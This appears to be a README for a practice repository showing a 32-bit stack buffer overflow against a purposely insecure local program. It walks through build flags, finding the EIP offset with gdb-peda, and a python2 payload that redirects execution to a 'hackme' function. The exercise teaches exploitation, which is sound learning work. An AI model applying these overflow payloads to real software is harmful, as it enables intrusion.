# bo-rop
Practicing buffer overflow using a ROP by [cr0w](https://youtu.be/6sUd3AA7Q50)

# Building
`gcc -m32 -no-pie insecure.c -o insecure`

# Target information
1. We are working in x86 (compiled with `-m32`)
2. Not stripped binary, so that we have the symbols in `gdb`
3. NX is enabled, we are forced to use ROP rather than write and [run shellcode directly from the stack](https://en.wikipedia.org/wiki/NX_bit).
4. PIE is disabled (compiled with `-no-pie`)

`file insecure`
> insecure: **ELF 32-bit LSB pie executable**, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=dee42c33330fab103841ff5f0745bdbdccb0705a, for GNU/Linux 3.2.0, **not stripped**

`pwn checksec ./insecure`
> Arch:       i386-32-little
> 
> RELRO:      Partial RELRO
> 
> Stack:      No canary found
> 
> NX:         NX enabled
>
> PIE:        No PIE (0x8048000)
> 
> Stripped:   No



# Exploitation

## Input

Using `python2` we can generate an input and pipe it to the program, resulting in a segfault:

`python2 -c 'print "A"*400' | ./insecure`

> [+] user supplied: 400-bytes!
> 
> fish: Process 60137, './insecure' from job 1, 'python2 -c 'print "A"*400' | ./…' terminated by signal SIGSEGV (Address boundary error)


## Controlling the EIP

`gdb-peda$ r < input.txt`

We can see the EIP being overwritten to `0x41414141 ('AAAA')`


In order to control the EIP we must first find what offset it is in our overflowed buffer, we create a recognizable pattern and output it to `pattern.txt`:

`gdb-peda$ pattern create 400 pattern.txt`

> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%y

We run the program with our pattern as an input and look for the EIP value:

`gdb-peda$ r < pattern.txt`

> EIP: 0x4325416e ('nA%C')


Now we can search the pattern:

`gdb-peda$ pattern offset 0x4325416e`

> 1126515054 found at offset: **216**

## Testing EIP

We check if the offset is correct by setting `BBBB` right where EIP should be. First we generate the input:

`python2 -c 'print "A"*216 + "BBBB"' > b_test.txt`

We run the program with out b test:

`gdb-peda$ r < b_test.txt`

> EIP: 0x42424242 ('BBBB')

and it worked!!

## ROP time

`gdb-peda$ info functions`

> All defined functions:

> Non-debugging symbols:

> 0x08049000  _init

> 0x08049030  __libc_start_main@plt

> 0x08049040  read@plt

> 0x08049050  printf@plt

> 0x08049060  system@plt

> 0x08049070  _start

> 0x0804909d  __wrap_main

> 0x080490b0  _dl_relocate_static_pie

> 0x080490c0  __x86.get_pc_thunk.bx

> 0x080490d0  deregister_tm_clones

> 0x08049110  register_tm_clones

> 0x08049150  __do_global_dtors_aux

> 0x08049180  frame_dummy

> 0x08049186  hackme

> 0x080491b1  secure

> 0x0804921a  main

> 0x08049236  __x86.get_pc_thunk.ax

> 0x0804923c  _fini

We can see `hackme()` located at `0x08049186`.

Now we can just put the address of `hackme()` inside the EIP, and it will return into the function!

`python2 -c 'print("A"*216 + "\x86\x91\x04\x08")' | ./insecure`

> hacked!

**Fin**
